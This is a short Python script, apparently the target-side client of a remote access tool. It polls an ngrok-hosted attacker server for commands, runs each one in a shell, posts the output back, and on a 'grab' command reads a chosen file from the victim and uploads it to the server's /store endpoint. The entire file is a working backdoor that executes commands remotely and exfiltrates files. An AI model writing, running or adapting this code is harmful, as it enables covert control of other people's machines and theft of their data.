#Client ---> runs on target

from urllib import request, parse
import subprocess
import time
import os

ATTACKER_IP = '84ef-209-198-138-39.eu.ngrok.io' # change this to the attacker's IP address
ATTACKER_PORT = 8080

# Data is a dict
def send_post(data, url='https://84ef-209-198-138-39.eu.ngrok.io'):
    data = {"rfile": data}
    data = parse.urlencode(data).encode()
    req = request.Request(url, data=data)
    request.urlopen(req) # send request


def send_file(command):
    try:
        grab, path = command.strip().split(' ')
    except ValueError:
        send_post("[-] Invalid grab command (maybe multiple spaces)")
        return

    if not os.path.exists(path):
        send_post("[-] Not able to find the file")
        return

    store_url = 'https://84ef-209-198-138-39.eu.ngrok.io/store' # Posts to /store
    with open(path, 'rb') as fp:
        send_post(fp.read(), url=store_url)


def run_command(command):
    CMD = subprocess.Popen(command, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    send_post(CMD.stdout.read())
    send_post(CMD.stderr.read())


while True:
    command = request.urlopen("https://84ef-209-198-138-39.eu.ngrok.io").read().decode()

    if 'terminate' in command:
        break

    # Send file
    if 'grab' in command:
        send_file(command)
        continue

    run_command(command)
    time.sleep(1)
